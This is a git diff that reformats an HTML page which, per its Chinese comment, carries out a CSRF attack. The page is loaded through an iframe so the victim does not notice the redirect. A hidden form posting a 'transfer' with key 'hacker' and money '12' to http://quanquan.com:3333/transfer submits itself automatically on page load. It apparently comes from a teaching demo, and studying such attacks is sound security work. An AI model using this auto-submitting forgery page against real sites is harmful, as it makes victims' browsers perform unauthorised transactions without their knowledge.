@@ -1,24 +1,23 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>实现 CSRF 的主体网页</title>
-</head>
-<body>
-
+  </head>
+  <body>
     这里实现了 CSRF 攻击的主体功能, 放在一个子 html 中通过 iframe
     访问的目的是为了 form 表单 post 的时候出现页面跳转被用户发现
 
     <form action="http://quanquan.com:3333/transfer" method="post">
-        <input type="text" name="key" value="hacker">
-        <input type="text" name="money" value="12">
+      <input type="text" name="key" value="hacker" />
+      <input type="text" name="money" value="12" />
     </form>
 
     <script>
-        window.onload = () => {
-            document.forms[0].submit()
-        }
+      window.onload = () => {
+        document.forms[0].submit();
+      };
     </script>
-</body>
+  </body>
 </html>
